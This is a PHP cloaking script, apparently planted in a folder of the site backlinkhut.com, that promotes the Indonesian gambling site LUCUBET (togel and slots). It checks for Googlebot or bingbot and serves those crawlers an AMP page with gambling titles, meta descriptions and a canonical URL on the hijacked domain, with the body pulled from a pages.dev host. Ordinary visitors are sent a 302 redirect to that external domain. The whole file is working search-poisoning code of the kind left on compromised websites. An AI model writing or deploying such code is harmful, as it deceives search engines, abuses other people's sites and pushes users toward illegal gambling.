<?php

$DOMAIN_CRAWLER = "https://backlinkhut.com";
$DOMAIN_PENGUNJUNG = "https://backlinkhut-com.pages.dev";
$FOLDER_PATH = "/seo-company-in-ludhiana";
$REDIRECT_ACTIVE = false;

$data_konten = [
    'LUCUBET' => [
        'title' => 'LUCUBET - Situs Togel & Slot Terbaik Mudah Jackpot 2025, Akses Resmi Terpercaya',
        'desc' => 'adalah situs penyedia Togel dan Slot terlengkap dengan fitur mudah Jackpot setiap harinya. akses lancar membuat pengalaman bermain lebih seru hanya disitus ini.',
        'content' => 'Hanya placeholder'
    ],

];

$keyword_url = isset($_GET['news_ID']) ? $_GET['news_ID'] : null;
$keyword_bersih = $keyword_url ? strtoupper(filter_var($keyword_url, FILTER_SANITIZE_STRING)) : null;

$is_crawler = (
    isset($_SERVER['HTTP_USER_AGENT']) && 
    (strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') !== false)
);

if (!$keyword_url || empty($keyword_bersih) || !isset($data_konten[$keyword_bersih])) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

$konten_spesifik = $data_konten[$keyword_bersih];
$judul_halaman = $konten_spesifik['title'];
$meta_deskripsi = $konten_spesifik['desc'];


$isi_utama_html = file_get_contents('https://backlinkhut-com.pages.dev'); 

$current_canonical_url = $DOMAIN_CRAWLER . $FOLDER_PATH . "/?news_ID=" . urlencode($keyword_bersih);

if ($REDIRECT_ACTIVE || $is_crawler === false) {
    $target_url = $DOMAIN_PENGUNJUNG . $FOLDER_PATH . "/?news_ID=" . urlencode($keyword_bersih);
    header("Location: " . $target_url, true, 302);
    exit();
}

if ($is_crawler) {
    header("Content-Type: text/html; charset=utf-8");
    ?>
    <!doctype html>
    <html amp lang="id">
    <head>
        <meta charset="utf-8">
        <script async src="https://cdn.ampproject.org/v0.js"></script>
        <title><?php echo $judul_halaman; ?></title>
        <link rel="canonical" href="<?php echo $current_canonical_url; ?>">
        <meta name="description" content="<?php echo $meta_deskripsi; ?>">
        <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
        
        <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    </head>
    <body>
        <?php echo $isi_utama_html; ?>
    </body>
    </html>
    <?php
}
?>
